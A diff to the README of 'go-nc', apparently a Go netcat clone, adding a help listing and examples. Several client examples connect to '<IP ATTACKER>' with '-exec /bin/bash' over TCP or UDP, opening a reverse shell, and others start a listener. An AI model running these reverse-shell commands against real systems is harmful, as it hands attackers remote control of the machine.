@@ -39,12 +39,59 @@ upx go-nc.exe
 
 # Usage
 
-### Reverse shell
+## Help
+```
+Usage of ./go-nc:
+  -exec string
+        command to execute
+  -host string
+        host to connect to
+  -listen
+        listen for incoming connections
+  -port int
+        port to connect to (default 4444)
+  -proto string
+        protocol to use (default "tcp")
+```
+
+## Examples
+
+### Client
+
+* Connect to attacker in port 4444/TCP with shell
+
 ```bash
-./go-nc -host <IP ATTACKER> -port 4444 -exec /bin/bash
+./go-nc -host <IP ATTACKER> -exec /bin/bash
+```
+
+* Connect to attacker in port 5353/UDP with shell
+
+```bash
+./go-nc -host <IP ATTACKER> -port 5353 -proto udp -exec /bin/bash
+```
+
+* Connect to attacker in port 4444/TCP without shell
+
+```bash
+./go-nc -host <IP ATTACKER>
+```
+
+* Connect to attacker in port 5353/UDP without shell
+
+```bash
+./go-nc -host <IP ATTACKER> -port 5353 -proto udp
 ```
 
 ### Server
+
+* Open port 4444/TCP in Listen mode
+
 ```bash
 ./go-nc -listen
+```
+
+* Open port 5353/UDP in Listen mode
+
+```bash
+./go-nc -listen -port 5353 -proto udp
 ```
